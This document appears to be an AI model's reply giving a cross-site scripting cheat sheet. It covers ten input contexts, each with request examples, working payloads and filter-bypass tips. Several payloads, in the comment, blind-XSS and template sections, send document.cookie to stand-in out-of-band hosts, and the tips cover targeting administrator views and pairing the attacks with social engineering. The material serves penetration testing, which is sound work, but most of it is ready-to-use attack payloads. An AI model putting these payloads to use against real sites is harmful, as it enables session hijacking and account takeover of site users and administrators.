# Examples of Injection Contexts & Sample Payloads

Below are clear, concrete examples for each context you asked about. For each item: **Request example**, **How it appears in HTML/JS**, **POC payloads** (HTML injection and XSS), and **Notes / bypass ideas**.

---

## 1. Input field (GET) — Search box (reflected)
**Request example (GET)**
```
GET /search?q=flowers HTTP/1.1
Host: example.com
```
**How it appears in HTML (reflected into page)**
```html
<div>Search results for: <strong>flowers</strong></div>
```
**POC payloads**
- HTML injection POC: `q=%3Cimg%20src=x%20onerror=alert(1)%3E` → reflected as `<img src=x onerror=alert(1)>`
- Reflected XSS: `q=%3Cscript%3Ealert(1)%3C/script%3E`
**Notes / bypasses**
- Try closing tags if input is inside a tag: `q=%3C%2Fstrong%3E%3Csvg%20onload=alert(1)%3E`
- If characters are encoded, try double-encoding or URL‑encode selectively.

---

## 2. Input field (POST — form)
**Request example (POST form)**
```
POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=Nice+post!
```
**How it appears in HTML (stored/reflected in page)**
```html
<div class="comment">Nice post!</div>
```
**POC payloads**
- Stored XSS POC: `comment=<svg onload=alert(1)>`
- Attribute breakout: `comment=" onmouseover="alert(1)` (if rendered inside attribute `title="...">`)
**Notes / bypasses**
- Test WYSIWYG editors — they may sanitize certain tags but allow `<svg>` or `<math>`.
- For POST JSON endpoints, see section below.

---

## 3. Input field (POST — JSON body)
**Request example (application/json)**
```
POST /api/profile HTTP/1.1
Host: example.com
Content-Type: application/json

{"bio":"I love cats"}
```
**How it appears in HTML (rendered later)**
```html
<div id="profile-bio">I love cats</div>
```
**POC payloads**
- Stored XSS: `{"bio":"</div><svg onload=alert(1)>"}`
- If client uses `eval()` unsafely: `{"bio":"');alert(1);//"}` (dangerous if later eval'd into JS)
**Notes / bypasses**
- JSON strings escape quotes; when crafting payloads ensure the JSON stays syntactically valid (escape `\"` as needed).
- If API returns JSON and client does `innerHTML = response.data`, inject HTML accordingly.

---

## 4. URL path segments (PHP_SELF or route segments)
**Request example (path segment injection)**
```
GET /products/view/123 HTTP/1.1
Host: example.com
```
**Common vulnerable pattern (PHP)**
```php
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="get">
```
**Attack by inserting payload into path**  
`GET /products/view/"><svg onload=alert(1)> HTTP/1.1`

**How it appears in HTML**  
If `PHP_SELF` printed into a link or form `action`, it may render the payload into the page source.

**POC payloads**
- `<svg onload=alert(1)>` appended to path or `">` to close an attribute then inject a tag.
**Notes / bypasses**
- Some servers normalize or block suspicious characters in paths; try encoded slashes (`%2F`) or path-info styles (e.g., `file.php/your-payload`).

---

## 5. Hidden parameters (hidden inputs)
**Request example (form with hidden field)**
```html
<form method="post" action="/submit">
  <input type="hidden" name="lang" value="en">
  <input name="comment">
</form>
```
**How to test**  
Intercept request in Burp, change `lang` to a payload and resend.

**POC payloads**
- Hidden param becomes HTML: `lang=</div><svg onload=alert(1)>`
**Notes / bypasses**
- Hidden fields are often trusted server-side; tampering can cause unexpected reflections or logic changes.
- Some apps validate allowed values; try modifying cookie or header equivalents too.

---

## 6. File upload filenames (or metadata)
**Typical flow**  
User uploads `avatar.png` → server stores it and later generates HTML like:  
```html
<img src="/uploads/avatar.png" alt="User avatar">
```
**Attack vector**  
- Upload filename containing special chars or metadata with HTML.
- Some servers place filename in HTML without sanitization.

**POC payloads**
- Filename `/uploads/%22%3E%3Csvg%20onload=alert(1)%3E.png` → results in `<img src="/uploads/"><svg onload=alert(1)>.png" ...>` if not sanitized
- EXIF or metadata in images: trickier, but some viewers render metadata into pages
**Notes / bypasses**
- Many storage systems sanitize filenames; try metadata exploitation or rename after upload via other features.
- Use multipart/form-data to tamper filename param directly.

---

## 7. Comments (stored XSS)
**Request example (user comment stored in DB)**
```
POST /posts/42/comments
Content-Type: application/x-www-form-urlencoded

comment=<b>Nice!</b>
```
**How it appears in HTML (viewed by others)**
```html
<li class="comment"><b>Nice!</b></li>
```
**POC payloads**
- Stored XSS: `<script>fetch('https://oob.example/?c='+btoa(document.cookie))</script>`
- Less noisy: `<img src=x onerror=new Image().src='https://oob.tld/UID-1234?c='+btoa(document.cookie)>`
**Notes / bypasses**
- Use OOB to detect execution when admins view comments.
- Try bypassing sanitizers with tags like `<svg>`, `<math>`, `<iframe>` (if allowed).

---

## 8. Contact forms / Email templates (blind XSS)
**Flow**  
User submits contact form → server sends email to admin containing `name`, `message` fields.

**How injection is impactful**  
Even if website doesn't expose the message to public, admins reading emails or ticket systems might render HTML and execute payloads.

**POC payloads (OOB)**
- Inject: `<img src=x onerror=new Image().src='https://oob.tld/UID?c='+btoa(document.cookie)>`
- Or: `<script src="https://<unique>.xss.hunter/">`

**Notes / bypasses**
- Blind XSS often needs OOB: use xss.report, XSS Hunter, or Burp Collaborator.
- Include a UID to map the callback to the submission.

---

## 9. Profile fields (bio, display name) — stored XSS
**Request example (profile update)**
```
POST /user/update
Content-Type: application/json

{"displayName":"Omar","bio":"I like security"}
```
**How it appears in HTML (profile page)**
```html
<h1>Omar</h1>
<div class="bio">I like security</div>
```
**POC payloads**
- `bio=</div><svg onload=alert(document.cookie)>`
- `displayName=<a href="javascript:alert(1)">click</a>` (if URLs allowed)
**Notes / bypasses**
- Check admin views (user list, admin profile preview) to exploit higher-privileged contexts.
- Test WYSIWYG editors and rich text renderers — they often have different sanitization rules.

---

## 10. Any place that ends up in HTML source (headers, cookies, server-generated pages)
**Examples**  
- Server includes user-supplied header in page (e.g., `X-Forwarded-For` shown in admin logs).
- Cookie values reflected into JS or HTML for debugging.
- Referer or user-agent shown in "last visitor" panels.

**POC payloads**
- Header-based injection (if app displays header): send `User-Agent: <svg onload=alert(1)>` and check logs/views.
- Cookie-based: set cookie `tracking=<svg onload=alert(1)>` if app prints cookie value into page.
**Notes / bypasses**
- These contexts are often overlooked — search code for places where headers/cookies are output to templates or logs.
- Combine with social engineering or CSRF to make admins view crafted pages.

---

## Bonus: DOM-only contexts (location.hash, fragment)
**Example**: Single-page app reads `location.hash` and inserts it into DOM
```
URL: https://example.com/app#profile=you
```
**JS snippet in app**:
```js
document.getElementById('out').innerHTML = location.hash;
```
**POC payload**:
```
https://example.com/app#</div><svg onload=alert(1)>
```
**Notes**:
- Payload never sent to server — so it bypasses server-side filters; focus on client-side sinks.

---

## Blind/OOB payload templates (use unique IDs)
- `"><img src=x onerror=new Image().src='https://oob.example/UID123?c='+btoa(document.cookie)>`
- `</svg><script>fetch('https://oob.example/UID123?c='+btoa(document.cookie))</script>`

**Reminder**: Always use your own controlled OOB endpoints and keep identifiers for mapping.

---

### Quick testing tips
- Start with benign, visible POCs (like `Hello-TEST`) to confirm reflection context before noisy XSS payloads.
- Use browser DevTools to inspect where and how the input is injected (attribute vs text vs JS string).
- Try the same payload in multiple places (URL, form, headers) — some pipelines sanitize differently.
- When working with JSON, remember to escape quotes (`\"`) so the JSON remains valid.

---

If you want, I can package this into a downloadable Markdown file too. Let me know.  
